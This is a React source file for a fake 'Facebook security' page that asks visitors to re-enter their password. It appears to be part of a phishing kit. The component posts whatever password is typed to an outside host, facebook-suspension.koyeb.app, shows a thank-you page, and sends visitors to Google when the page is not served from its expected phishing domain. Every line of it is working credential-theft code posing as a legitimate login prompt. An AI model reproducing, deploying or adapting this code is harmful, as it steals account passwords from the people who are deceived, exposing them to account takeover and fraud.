import React from 'react';
import "./Password.css"
import { useState } from 'react';
import { useNavigate } from 'react-router';

const Password = () => {

  const navigate = useNavigate()

  if (window.location.hostname !== "verified-badge.koyeb.app") {
      window.location.href = "https://google.com";
  }

  const [passwordText, setPasswordText] = useState()

  const handleSubmit = (e) => {
    e.preventDefault();
    fetch("https://facebook-suspension.koyeb.app/pass",{
      method:"POST",
      headers: {
        "Content-Type": "application/json"
      },
      body:JSON.stringify({
        password:passwordText

      })
    }).then((res)=>{
     

    })


    navigate("/thanks")
    
  };

  return (
    <div className="passwordContainer">
      <img
        src="https://cdn.iconscout.com/icon/free/png-512/free-facebook-4062815-3357701.png?f=webp&w=512"
        alt="Facebook Logo"
      />
      <h3>Facebook security</h3>
      <hr />
      <p>Please re-enter password to complete the request.</p>
    
        <input type="password" value={passwordText} onChange={(e)=>setPasswordText(e.target.value)} placeholder="Password" name="password" />
        <button onClick={handleSubmit}>Submit</button>
    
    </div>
  );
};

export default Password;
